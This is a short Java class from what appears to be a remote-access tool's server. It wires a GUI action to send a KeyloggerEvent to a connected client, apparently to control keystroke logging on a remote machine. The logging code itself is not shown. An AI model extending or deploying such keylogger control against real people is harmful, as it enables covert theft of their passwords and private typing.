package TableUtils.KeyLogger.Actions;

import Server.Client;
import Utilities.Action.AbstractActionGUI;
import Utilities.AbstractDialogCreator;
import Utilities.Action.AbstractActionNoGUI;
import Utilities.GetSYS;
import TableUtils.KeyLogger.Constants.KeyLog;
import TableUtils.KeyLogger.Events.KeyloggerEvent;

import java.awt.event.ActionEvent;

public class KeyLoggerAction extends AbstractActionNoGUI {

    private final KeyLog keyLog;

    public KeyLoggerAction(KeyLog keyLog){
        this.keyLog = keyLog;
    }


    @Override
    public void actionPerformed(ActionEvent e) {
        Client client = GetSYS.getClientHandler();
        if (client != null)
            client.getExecutor().submit(new KeyloggerEvent(client, keyLog));
    }
}
